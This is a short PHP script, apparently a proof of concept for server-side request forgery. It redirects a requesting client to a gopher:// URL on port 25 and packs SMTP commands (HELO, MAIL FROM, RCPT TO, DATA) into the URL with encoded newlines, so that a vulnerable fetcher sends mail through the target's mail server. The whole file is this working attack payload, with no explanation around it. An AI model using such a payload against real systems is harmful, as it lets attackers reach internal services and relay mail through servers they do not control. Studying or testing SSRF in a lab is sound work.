<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: <aaaaaaaaaaa@tester.com>',
                'RCPT TO: <bit-bucket@test.smtp.org>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://test.smtp.org:25/_'.$payload);
?>
